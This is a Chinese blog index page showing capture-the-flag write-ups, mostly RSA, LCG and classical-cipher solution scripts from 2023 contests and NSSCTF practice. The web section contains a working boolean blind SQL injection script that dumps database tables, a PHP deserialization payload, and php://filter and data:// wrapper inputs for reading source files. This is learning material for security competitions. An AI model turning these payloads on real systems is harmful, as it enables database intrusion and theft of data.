
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Arcueid&#39;s BLOG</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div id="home-posts-wrap" true ref="homePostsWrap">
    <div id="home-posts">
        

<div class="post">
    <a href="/2023/05/23/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AFrsa%E5%A4%8D%E7%9B%98/">
        <h2 class="post-title">2023天一永安杯rsa复盘</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/23
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h1><pre><code class="c">from Crypto.Util.number import *
from math import gcd
from secret import flag

def gen_key(nbits, gamma):
    g = getPrime(int(nbits * gamma)) 
    alpha = 0.5 - gamma
    while True:
        a = getPrime(int(alpha * nbits))
        p = 2 * g * a + 1 
        if isPrime(p):
            break
    while True:
        b = getRandomNBitInteger(int(alpha * nbits))
        q = 2 * g * b + 1
        h = 2 * g * a * b + a + b
        if isPrime(q) and isPrime(h) and gcd(a, b) == 1:
            return p*q,a,g
        else:
            continue
        
n,a,g = gen_key(1024, 0.05)
e = 65537
c = pow(bytes_to_long(flag),e,a*g)
print(n,c,a)

&#39;&#39;&#39;
n=36535558847082719901201561031181835346574576610950713924924272947759193576365817762980927638691696601293089537315055413746788190208875234794229119049056299551864869870291634941246362436491006904347559559494705922259007299126640817275929491680601926404543198957206717290905220235571289759182878331893962038379
c=532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229
a=2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439
&#39;&#39;&#39;
</code></pre>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>其实挺简单的,当初一看500分,觉得不是我能动的题,下来复盘了一下后悔没细看</p>
<p>过程如下<br><code>p*q = 2g(a+b) + 4ab*g**2 +1 </code><br>而<code>a+b+2gab == h</code><br>化简得到<br><code>p*q-1 = 2gh</code></p>
<p>本题的公钥是<code>(e,a*g)</code><br>我们可以考虑用<code>p*q-1 = 2gh</code><br>分解得到g<br><code>n = (n-1) // 2</code></p>
<p>因为g是<code>51位</code>的<br>h是约为<code>972位</code>的<br>相差很大可以用yafu分解或者factordb查一下<br>得到</p>
<pre><code class="c">g = 1346104232461691

h = 13570850594633462506426369052182298554140635599543685835372377476383038708650421475723391142118956001358520246769650699398490037618758005241062608387057439283872260149565854577827352267289963736282502923131251179400580891491236925451166755184695335564693793568286112036468975877609637392241679
</code></pre>
<p>于是脚本如下</p>
<pre><code class="python">from Crypto.Util.number import *
import gmpy2

c = 532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229
a = 2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439
g = 1346104232461691
e = 65537

d = gmpy2.invert(e,(g-1)*(a-1))
print(long_to_bytes(pow(c,d,a*g)))
# b&#39;flag&#123;p01la4d_rHo_a1gOr1thM_r1gh4&#125;&#39;
</code></pre>
<p>后来做到了羊城杯2021的一道类似的rsa<br>才知道这是<code>Common Prime RSA</code><br>常见的攻击方法有<br>1.修改Pollard’s rho方法分解n<br>2.知道a,b<br>3.知道g<br>4.分解n-1</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>痛失线下赛,要哭哭惹</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
        </span>
        
    </div>
    <a href="/2023/05/23/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AFrsa%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/22/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86wp/">
        <h2 class="post-title">2023天一永安杯部分wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/22
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>布尔盲注</p>
<pre><code class="python">import requests
import string

dictionary = string.digits+string.ascii_letters+&quot;_-&#123;,&#125;&quot;
url = &quot;http://cd5a2660b462c867.node.nsctf.cn/login.php&quot;
xxx=&quot;&quot;
for i in range(1,666):
    print(&quot;正在爆破第&#123;&#125;位&quot;.format(i))
    for j in dictionary:
        flag = True
        
        # payload = &quot;admin&#39;and substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1) = binary&#39;&#123;&#125;&#39; #&quot;.format(i,j)  
        # payload = &quot;admin&#39;and substr((select group_concat(table_name) from information_schema.tables where table_schema = &#39;ctf&#39;),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
        # payload = &quot;admin&#39;and substr((select group_concat(column_name) from information_schema.columns where table_schema = &#39;ctf&#39; and table_name = &#39;f111&#39;),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
        payload = &quot;admin&#39;and substr((select group_concat(flagdata) from ctf.f111),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              

        data = &#123;&#39;password&#39;:&#39;admin&#39;,&#39;username&#39;:payload&#125;
        res = requests.post(url=url,data=data)

        if (&#39;admin&#39; in res.text):
            xxx += j
            print(xxx)
            flag = False
            break
    if(flag):
        print(xxx)
        break
</code></pre>
<h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>伪协议读源码</p>
<p>route.php</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d01ad9ca8d2e7da82cf71d2b907aa258.png" alt="image-20230520130408427"></p>
<p>h1nt.php</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f00204ef3a75d5f39fe8b86f06b56452.png" alt="image-20230520130421846"></p>
<p>构造</p>
<pre><code class="php">&lt;?php
class test
&#123;
    public $position = &#39;f14g.php&#39;;
    public function __clone()&#123;  
        echo file_get_contents($this-&gt;position); 
        return $this-&gt;position;
    &#125;
&#125;  
$a = new test();
echo urlencode(serialize($a));
</code></pre>
<p>然后在index.php包含h1nt.php</p>
<pre><code>read=h1nt.php&amp;input=O%3A4%3A%22test%22%3A1%3A%7Bs%3A8%3A%22position%22%3Bs%3A8%3A%22f14g.php%22%3B%7D
</code></pre>
<h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><p>这里利用data协议使得get_file_content返回的值为flag</p>
<pre><code>?a=data://text/plain,flag&amp;b=data://text/plain,flag&amp;c=flag&amp;d=php://filter//convert.iconv.SJIS*.UCS-4*/resource=index.php
</code></pre>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>e phi 不互素</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/15960561067d54be25329549f37a1ee4.png" alt="image-20230520133647746"></p>
<h2 id="流哇流"><a href="#流哇流" class="headerlink" title="流哇流"></a>流哇流</h2><p>flag2</p>
<pre><code class="python">from sympy import *
from gmpy2 import *
from functools import reduce
from primefac import *
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)
def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception(&#39;modular inverse does not exist&#39;)
    else:
        return x % m
def crack_unknown_increment(states, modulus, multiplier): 
    increment = (states[1] - states[0]*multiplier) % modulus 
    return modulus, multiplier, increment
def crack_unknown_multiplier(states, modulus):    
    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus 
    return crack_unknown_increment(states, modulus, multiplier)

def crack_unknown_modulus(states): 
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] 
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] 
    modulus = abs(reduce(gcd, zeroes)) 
    return crack_unknown_multiplier(states, modulus)

states = [7762911616316678361, 8778349545254661087, 2182563361653435704, 1383751637647655272, 4512576578889812021, 4322633144718249958, 3959701111371594748, 7676663421477866678, 5009230933212388616, 3780469426700690705]
seed = 6473702802409947663
modulus, multiplier, increment =crack_unknown_modulus(states)
print(modulus)   #9223372036854775783
print(multiplier)   # 672257317069504228
print(increment) #0
</code></pre>
<p>flag1找到类似的原题了,ciscn的</p>
<p>直接改改数值套脚本</p>
<pre><code class="python">key = &#39;11110010001101101001001110001001&#39;
mask = &#39;10100100000010000000100010010100&#39;
 
R = &#39;&#39;
tem = key
for i in range(32):
    output = &#39;?&#39; + key[:31]
    ans = int(tem[-1-i]) ^ int(output[-3]) ^ int(output[-5]) ^ int(output[-8]) ^ int(output[-12]) ^ int(output[-20]) ^ int(output[-27]) ^ int(output[-30])
    R += str(ans)
    key = str(ans) + key[:31]
 
# R = format(int(R[::-1],2),&#39;z&#39;)
R = str(hex(int(R[::-1],2))[2:])
print(R)
</code></pre>
<pre><code class="python">flag2 = 9223372036854775783
# flag1 = 0x81415720
flag1 = 2168543008
flag = &#39;81415720&#39;+str(flag2)
print(hashlib.md5(flag.encode(&quot;utf-8&quot;)).hexdigest())
</code></pre>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>爆破密码01组成的9位</p>
<p>然后解压得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cd2b8c4828c69e7d98fd075cdc1a763d.png" alt="image-20230520133753893"></p>
<h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/54606980448d92c26f0fe643e9137b46.png" alt="image-20230520133905424"></p>
<p>foremost 抽出pdf 全选复制得到flag</p>
<h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/4e23291ee711087bf6bc4315e8648cf2.png" alt="image-20230520133831529"></p>
<p>zsteg 出base64 解码得flag</p>
<h1 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h1><h2 id="peacock"><a href="#peacock" class="headerlink" title="peacock"></a>peacock</h2><p>dex2jar</p>
<p>看了看jar包没什么东西,那么核心应该在so里</p>
<p>ida看so文件</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7c97834bb931d58cb735a3b046941f0c.png" alt="image-20230520131457608"></p>
<p>感觉最后那两个字符串像base64</p>
<p>然后考虑base64换表,表就是下面那个,解得flag</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>妈的应该是阳了,头巨痛,还得好好学,输出太低了</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #03a9f4">php</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
        </span>
        
    </div>
    <a href="/2023/05/22/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/22/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(1)/">
        <h2 class="post-title">NSS周常刷密码(1)</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/22
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>感觉没怎么做密码,就每周上nss随便做点<br>稍微难点的会分析</p>
<h1 id="SWPU-2020-happy"><a href="#SWPU-2020-happy" class="headerlink" title="[SWPU 2020]happy"></a>[SWPU 2020]happy</h1><pre><code class="python">import gmpy2
from Crypto.Util.number import *
import z3

c = 0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e    
e = 0x872a335
#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586
#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594
a = 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586
b = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594
p , q = z3.Ints(&#39;p q&#39;)
s = z3.Solver()
s.add(q + q*p**3 == a)
s.add(q*p + q*p**2 == b)
s.check()
print(s.model())

p = 1158310153629932205401500375817
q = 827089796345539312201480770649
print(long_to_bytes(pow(c,gmpy2.invert(e,(p-1)*(q-1)),p*q)))
</code></pre>
<h1 id="AFCTF2018-BASE"><a href="#AFCTF2018-BASE" class="headerlink" title="[AFCTF2018]BASE"></a>[AFCTF2018]BASE</h1><pre><code class="python">import base64 
import re
b64 = re.compile(b&quot;^[a-zA-Z0-9+/=]*$&quot;)
b16 = re.compile(b&quot;^[0-9A-F=]*$&quot;)
b32 = re.compile(b&quot;^[A-Z2-7=]*$&quot;)

res =  open (&quot;flag_encode.txt&quot;,&quot;rb&quot;).read()
while True:
    if b16.match(res):
        res = base64.b16decode(res)
    elif b32.match(res):
        res = base64.b32decode(res)
    elif b64.match(res):
        res = base64.b64decode(res)
    elif b&quot;afctf&quot; in res:
        print(res.decode())
        break
</code></pre>
<h1 id="SWPUCTF-2021-新生赛-crypto2"><a href="#SWPUCTF-2021-新生赛-crypto2" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto2"></a>[SWPUCTF 2021 新生赛]crypto2</h1><p>共模<br><img src="https://img-blog.csdnimg.cn/8a39a2f69e5e4a7c98cdabefca1b6a44.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2021-新生赛-crypto9"><a href="#SWPUCTF-2021-新生赛-crypto9" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto9"></a>[SWPUCTF 2021 新生赛]crypto9</h1><pre><code class="python">import itertools

#AKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125;

letter_list = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;  # 字母表


# 根据输入的key生成key列表
def Get_KeyList(key):
    key_list = []
    for ch in key:
        key_list.append(ord(ch.upper()) - 65)
    return key_list


# 加密函数
def Encrypt(plaintext, key_list):
    ciphertext = &quot;&quot;

    i = 0
    for ch in plaintext:  # 遍历明文
        if 0 == i % len(key_list):
            i = 0
        if ch.isalpha():  # 明文是否为字母,如果是,则判断大小写,分别进行加密
            if ch.isupper():
                ciphertext += letter_list[(ord(ch) - 65 + key_list[i]) % 26]
                i += 1
            else:
                ciphertext += letter_list[(ord(ch) - 97 + key_list[i]) % 26].lower()
                i += 1
        else:  # 如果密文不为字母,直接添加到密文字符串里
            ciphertext += ch
    return ciphertext


# 解密函数
def Decrypt(ciphertext, key):
    plaintext = &quot;&quot;
    key_list = Get_KeyList(key)
    i = 0
    for ch in ciphertext:  # 遍历密文
        if 0 == i % len(key_list):
            i = 0
        if ch.isalpha():  # 密文为否为字母,如果是,则判断大小写,分别进行解密
            if ch.isupper():
                plaintext += letter_list[(ord(ch) - 65 - key_list[i]) % 26]
                i += 1
            else:
                plaintext += letter_list[(ord(ch) - 97 - key_list[i]) % 26].lower()
                i += 1
        else:  # 如果密文不为字母,直接添加到明文字符串里
            plaintext += ch
    return plaintext


itrator = [&quot;&quot;.join(i) for i in itertools.product(letter_list,repeat=3)]


for i in itrator:
    res = Decrypt(&quot;AKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125;&quot;,&quot;&quot;.join(i))
    if  &quot;NSSCTF&quot; in res:
        print(res)
</code></pre>
<h1 id="AFCTF-2018-你能看出这是什么加密么"><a href="#AFCTF-2018-你能看出这是什么加密么" class="headerlink" title="[AFCTF 2018]你能看出这是什么加密么"></a>[AFCTF 2018]你能看出这是什么加密么</h1><p><img src="https://img-blog.csdnimg.cn/2710dbcff38e41ee933ac3129a571232.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2021-新生赛-crypto4"><a href="#SWPUCTF-2021-新生赛-crypto4" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto4"></a>[SWPUCTF 2021 新生赛]crypto4</h1><p>pq接近容易分解,或者factordb<br><img src="https://img-blog.csdnimg.cn/9f84dc2d2e5242dba7ac48b1625c6cac.png" alt="在这里插入图片描述"></p>
<h1 id="安洵杯-2019-JustBase"><a href="#安洵杯-2019-JustBase" class="headerlink" title="[安洵杯 2019]JustBase"></a>[安洵杯 2019]JustBase</h1><p>题目是base<br>然后一眼过去不是正经base<br>先解码试试,发现里面是可以出一些看着像是人能阅读的英语的<br><code>b&#39;The geo\x1b\xd9\x92\x06\xd8\x81\xd1\xa1\x94\x81\x15\x85\xc9\xd1\xa0\x93 q\\\x99\x98X\xd9H\x1a\\\xc8\x19\x1b\xa5\xb9\x85ed by the partia[\x18\\\x88\x1c\x1c\x9b\xdc\x19\\\x9d\x1aY\\\xc8\x1b\xd9\x88\x16\x17FW&quot;\x81A\xc9\x95\xc5nt on EarZ\x08\x1a[\x88\x1c\xdb\xc6\x96B\xc2\x06\xc6\x97\x17V\x96B\xc2\x06\x16\xe6B\x06E\xcd\x95\x9c\xc8\x1c\xdd\x18VW2\xc2\x07v\x17FW&quot;\x06\x972\x06U\x85ptionally reaa\x1a]\x99K\x88\x12R\x06F\x97\r\xbd\xb1\xd9\x95\xcc\xb0\x81\xd1\xc9\x85\xb9\xcd\xc1\xb2\\\xcb\x08\x18ZB\x07\x07&amp;V6\x97\x06\x95\x85\xd1\x95\xcc\x81\xb5\x85\x88\x18\xda\x19Z\x96\x05\xb0\x81\x8d\xbd\xb5\xc1\xbd\xd5\xa4s and is b\xe7\x11\x85\xb9\xd1\xb1\xe4\x81\xb5\xb4ifying the faaH\x1bb\x07F\x86R\x04V\x17\&#39;F\x82\xe2\x04Wf\x17\x06\xc9\x85\xd1\x95\x90\x81\x99\xc9\xb8\x1d\x1a\x19H\x1a6V\x16\xe72\xc2\x07Eer vapl\x88\x19\x9b&amp;\xd72\x061\xbd\xd5\x91\xcc\xb0\x81\xcd\xb9H\x1ab\x07v\x86\x966\x82\x06\x17&amp;R\x05\xc9\x85\xb9\xc0orted by ZZB\x06er the continents. Condensation frkH\x1d\x1a\x19H\x18\xdb\x19\x91\xcc\x81\xc1\xc9\xbd\xd9\xa5\x91\x95\xcc\x81\xd1\xa1\x94\x81\x95\xcd\xc5ntial ae[\x9d\x08\x1b\xd9\x88\x18\xdbii[\x9d\x18[\x08\x19\\\x9b6\x96\xb8\xe8\x81\xc9\x85\xa5\xb8\xb9Q\xa1\x94\x81\xc9\x85\xd1\x94\x81\x85 which a mk\x19X\xd6\xc6R\x06\xd8\x81\xd1Y\\\x88\x1c\x18\\\xdcW2\x07F\x86\xd5\x9d\xa0\x81he bX\xdb\x19H\x1a\\\xc8\x1b\x98\x81\xc9\x85\xb9\x91\xbd\xb4)\x05\xb9\x90\x81\xd1\xa1\x94\x81\x99\xb1\x85\x9c\x81\xa5\xcc CTF&#123;22$UU%E\x95T\x94\xb5A1-)!\x1d\x19\x11L\xb5\x05ia\rY\t\r&#125;&#39;</code><br>然后通篇没有数字,猜测是把数字换成符号了<br>于是脚本如下</p>
<pre><code class="python">import base64

res = open(&quot;enc.txt&quot;,&quot;rb&quot;).read().decode()
res = res.replace(&quot;!&quot;,&quot;1&quot;).replace(&quot;@&quot;,&quot;2&quot;).replace(&quot;#&quot;,&quot;3&quot;).replace(&quot;$&quot;,&quot;4&quot;).replace(&quot;%&quot;,&quot;5&quot;).replace(&quot;^&quot;,&quot;6&quot;).replace(&quot;&amp;&quot;,&quot;7&quot;).replace(&quot;*&quot;,&quot;8&quot;).replace(&quot;(&quot;,&quot;9&quot;).replace(&quot;)&quot;,&quot;0&quot;)
print(base64.b64decode(res))
</code></pre>
<h1 id="SWPUCTF-2021-新生赛-crypto5"><a href="#SWPUCTF-2021-新生赛-crypto5" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto5"></a>[SWPUCTF 2021 新生赛]crypto5</h1><p>题只给了n c<br>我没辙了</p>
<p>看wp说是小e<br>爆破e<br>于是脚本如下</p>
<pre><code class="python">from  Crypto.Util.number import *
import gmpy2
c = 25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333
n = 134109481482703713214838023035418052567000870587160796935708584694132507394211363652420160931185332280406437290210512090663977634730864032370977407179731940068634536079284528020739988665713200815021342700369922518406968356455736393738946128013973643235228327971170711979683931964854563904980669850660628561419

for e in range(1,2**16):
    for k in range(5000):
        if gmpy2.iroot((c + k*n),e)[1]:
            flag = long_to_bytes(gmpy2.iroot(c + k*n,e)[0])
            if b&quot;NSSCTF&quot; in flag:
                print(flag)
                break
</code></pre>
<h1 id="BJDCTF-2020-rsa"><a href="#BJDCTF-2020-rsa" class="headerlink" title="[BJDCTF 2020]rsa"></a>[BJDCTF 2020]rsa</h1><pre><code class="c">from  Crypto.Util.number import *
import gmpy2
c1 = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120
n1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037
c2 = 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018
c3 = 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721
n2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047

q = gmpy2.gcd(n1,n2)
p1 = n1 // q
p2 = n2 // q
# for e in range(1,100000):
#     if pow(294,e,n1) == c2:
#         print(e)
        # 52361

e = 52361
print(long_to_bytes(pow(c1,gmpy2.invert(e,(p1-1)*(q-1)),n1)))
</code></pre>
